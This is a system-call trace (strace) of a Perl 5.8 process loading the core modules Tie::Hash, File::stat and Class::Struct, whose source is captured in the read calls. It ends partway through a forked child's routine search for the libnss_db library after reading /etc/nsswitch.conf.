10890 07:35:08.696523 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.696538 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.696557 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
10890 07:35:08.696871 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
10890 07:35:08.697387 read(8, "", 4096) = 0
10890 07:35:08.697404 close(8)          = 0
10890 07:35:08.697434 stat64("/etc/perl/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697457 stat64("/etc/perl/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697474 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697490 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697505 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697518 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697532 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697544 stat64("/usr/lib/perl5/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697557 stat64("/usr/share/perl5/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697570 stat64("/usr/share/perl5/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697584 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697596 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697610 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.697623 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
10890 07:35:08.697645 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.697660 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.697672 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.697689 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
10890 07:35:08.698101 stat64("/etc/perl/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698120 stat64("/etc/perl/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698134 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698148 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698162 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698175 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698190 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698202 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698215 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698227 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698241 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698254 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698268 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.698281 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
10890 07:35:08.698303 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
10890 07:35:08.698318 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbbfcd8) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.698329 _llseek(10, 0, [0], SEEK_CUR) = 0
10890 07:35:08.698348 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
10890 07:35:08.698750 brk(0x82de000)    = 0x82de000
10890 07:35:08.699106 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
10890 07:35:08.699670 _llseek(10, 6916, [6916], SEEK_SET) = 0
10890 07:35:08.699688 _llseek(10, 0, [6916], SEEK_CUR) = 0
10890 07:35:08.699699 close(10)         = 0
10890 07:35:08.699872 _llseek(8, 1334, [1334], SEEK_SET) = 0
10890 07:35:08.699888 _llseek(8, 0, [1334], SEEK_CUR) = 0
10890 07:35:08.699902 close(8)          = 0
10890 07:35:08.700491 brk(0x82ff000)    = 0x82ff000
10890 07:35:08.704166 _llseek(5, 2689, [2689], SEEK_SET) = 0
10890 07:35:08.704183 _llseek(5, 0, [2689], SEEK_CUR) = 0
10890 07:35:08.704193 close(5)          = 0
10890 07:35:08.704334 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e08908) = 10891
10891 07:35:08.714413 getppid()         = 10890
10891 07:35:08.714491 open("/etc/nsswitch.conf", O_RDONLY) = 5
10891 07:35:08.714515 fstat64(5, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10891 07:35:08.714535 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fce000
10891 07:35:08.714549 read(5, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10891 07:35:08.714600 read(5, "", 4096) = 0
10891 07:35:08.714610 close(5)          = 0
10891 07:35:08.714620 munmap(0xb7fce000, 4096) = 0
10891 07:35:08.714647 open("/etc/ld.so.cache", O_RDONLY) = 5
10891 07:35:08.714661 fstat64(5, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10891 07:35:08.714678 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7dd5000
10891 07:35:08.714689 close(5)          = 0
10891 07:35:08.714700 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10891 07:35:08.714718 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714732 stat64("/lib/tls/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714746 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714760 stat64("/lib/tls/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714771 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714784 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.714802 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714815 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.714832 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714845 stat64("/lib/tls/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714856 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714868 stat64("/lib/tls/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714879 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714892 stat64("/lib/tls/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714902 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714914 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.714931 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714945 stat64("/lib/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714956 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.714968 stat64("/lib/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.714988 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715002 stat64("/lib/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715013 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715030 stat64("/lib/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715041 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
